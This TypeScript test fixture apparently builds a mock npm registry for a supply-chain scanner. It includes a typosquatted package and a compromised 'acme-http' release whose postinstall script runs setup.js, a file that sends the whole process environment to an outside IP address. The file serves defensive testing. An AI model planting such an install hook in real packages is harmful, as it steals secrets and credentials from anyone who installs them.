import { computeIntegrity } from "../../src/integrity.ts";
import { type FixtureFile, makeTgz } from "./tarWriter.ts";

export interface FixtureVersion {
  files: FixtureFile[];
  scripts?: Record<string, string>;
  maintainer: { name: string; email: string };
  provenance?: boolean;
  ageHours: number;
  integrity?: string;
  missingTarball?: boolean;
}
export interface FixturePackage {
  name: string;
  downloads: number;
  latest: string;
  versions: Record<string, FixtureVersion>;
}

export const pkgJson = (
  name: string,
  version: string,
  scripts?: Record<string, string>,
): FixtureFile => ({
  path: "package.json",
  content: JSON.stringify({ name, version, ...(scripts ? { scripts } : {}) }),
});

export const FIXTURES: FixturePackage[] = [
  {
    name: "left-pad",
    downloads: 5_000_000,
    latest: "1.3.0",
    versions: {
      "1.3.0": {
        files: [
          pkgJson("left-pad", "1.3.0"),
          { path: "index.js", content: "module.exports=(s,n)=>String(s).padStart(n);" },
        ],
        maintainer: { name: "stevemao", email: "steve@example.com" },
        provenance: true,
        ageHours: 8760,
      },
    },
  },
  {
    name: "chalk",
    downloads: 300_000_000,
    latest: "5.6.1",
    versions: {
      "5.6.1": {
        files: [pkgJson("chalk", "5.6.1"), { path: "index.js", content: "module.exports=s=>s;" }],
        maintainer: { name: "qix", email: "qix@example.com" },
        provenance: true,
        ageHours: 2,
      },
    },
  },
  {
    name: "lodahs",
    downloads: 47,
    latest: "1.0.3",
    versions: {
      "1.0.3": {
        files: [
          pkgJson("lodahs", "1.0.3"),
          { path: "index.js", content: "module.exports=require('./real');" },
        ],
        maintainer: { name: "newguy", email: "newguy@proton.me" },
        ageHours: 6,
      },
    },
  },
  {
    name: "acme-http",
    downloads: 2_000_000,
    latest: "1.0.1",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("acme-http", "1.0.0"),
          { path: "index.js", content: "module.exports={get(){}};" },
        ],
        maintainer: { name: "acme-maint", email: "maint@acme.dev" },
        provenance: true,
        ageHours: 4320,
      },
      "1.0.1": {
        files: [
          pkgJson("acme-http", "1.0.1", { postinstall: "node ./setup.js" }),
          { path: "index.js", content: "module.exports={get(){}};" },
          {
            path: "setup.js",
            content:
              "const cp=require('child_process');const https=require('https');const env=JSON.stringify(process.env);https.request('http://185.62.190.9/collect',{method:'POST'}).end(env);",
          },
        ],
        scripts: { postinstall: "node ./setup.js" },
        maintainer: { name: "acme-maint", email: "attacker@proton.me" },
        provenance: false,
        ageHours: 2,
      },
    },
  },
];

export interface Materialized {
  packuments: Record<string, unknown>;
  tarballs: Record<string, Uint8Array<ArrayBuffer>>;
  downloads: Record<string, number>;
}

export function materialize(base: string, packages: FixturePackage[] = FIXTURES): Materialized {
  const packuments: Record<string, unknown> = {};
  const tarballs: Record<string, Uint8Array<ArrayBuffer>> = {};
  const downloads: Record<string, number> = {};
  const now = Date.now();

  for (const pkg of packages) {
    downloads[pkg.name] = pkg.downloads;
    const versions: Record<string, unknown> = {};
    const time: Record<string, string> = {};
    for (const [ver, v] of Object.entries(pkg.versions)) {
      const tgz = makeTgz(v.files);
      const tarballPath = `/${pkg.name}/-/${pkg.name}-${ver}.tgz`;
      if (!v.missingTarball) tarballs[tarballPath] = tgz;
      time[ver] = new Date(now - v.ageHours * 3_600_000).toISOString();
      versions[ver] = {
        name: pkg.name,
        version: ver,
        scripts: v.scripts,
        maintainers: [{ name: v.maintainer.name }],
        _npmUser: v.maintainer,
        dist: {
          tarball: `${base}${tarballPath}`,
          integrity: v.integrity ?? computeIntegrity(tgz),
          ...(v.provenance
            ? { attestations: { url: `${base}/-/npm/v1/attestations/${pkg.name}@${ver}` } }
            : {}),
        },
      };
    }
    packuments[pkg.name] = {
      name: pkg.name,
      "dist-tags": { latest: pkg.latest },
      time,
      versions,
      maintainers: [{ name: Object.values(pkg.versions)[0]!.maintainer.name }],
    };
  }
  return { packuments, tarballs, downloads };
}
